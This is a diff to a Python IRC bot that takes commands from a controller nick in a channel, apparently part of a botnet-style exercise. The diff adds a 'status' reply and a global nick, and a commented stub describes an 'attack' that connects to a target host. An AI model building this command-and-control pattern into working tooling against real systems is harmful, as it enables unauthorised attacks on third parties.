@@ -7,11 +7,13 @@ import time
 
 # Function to get a nick with a high probability of being unique by using randomness
 def getNick():
+    global nick
     rootOfName = "minion"
     candidateTail = ""
     for _ in range(4):
         candidateTail = candidateTail + str(random.choice(string.ascii_letters + string.digits))
-    return (rootOfName + candidateTail)
+    nick = (rootOfName + candidateTail)
+    return nick
 
 # Function to connect to IRC server and send NICK and USER messages
 # Will also join CHANNEL if it exist and create it if it doesnt
@@ -48,6 +50,7 @@ def listen():
     madeContactWithControl = False
     try:
         while(True):
+            print("Listening to IRC channel traffic...")
             ircmessage = IRCconnection.recv(512)
             ircmessage = ircmessage.decode("utf-8")
             print("received: " + ircmessage)
@@ -69,7 +72,8 @@ def listen():
                     nickOfSender = (splitmessage[0].split("!")[0])[1:]
                     if((lastWord == "shutdown") and (madeContactWithControl) and (nickOfSender == controllerNick)):
                         shutdownBot()
-                    print("received word: " + lastWord)
+                    elif((lastWord == "status") and (madeContactWithControl) and (nickOfSender == controllerNick)):
+                        sendStatus()
 
     except Exception as e:
         print("Error2: " + str(e))
@@ -85,18 +89,17 @@ def joinChannel(chann):
     response = IRCconnection.recv(512)
     print(response.decode("utf-8"))
 
+# Function that sends the nick of the bot to the controller via private message #TODO: send attack count or any other info too?
+def sendStatus():
+    print("Recieved 'status' command from controller.")
+    statusMessage = "PRIVMSG " + controllerNick + " " + nick + "\r\n"
+    print("sending: " + statusMessage)
+    IRCconnection.sendall(statusMessage.encode("utf-8"))
+    print("Status sent to controller.")
+    return
+
+
 '''
-def sendMessage():
-
-def joinChannel():
-
-def leaveChannel():
-
-def authenticateController():
-
-# Function that sends the nick of the bot to the controller
-def sendStatus:
-
 # Function that attacks hostName:hostPort by attempting to connect to hostName:hostPort
 # and sending a string containing the attack count and nick of the bot. Sends status message
 # to controler after attack is attempted
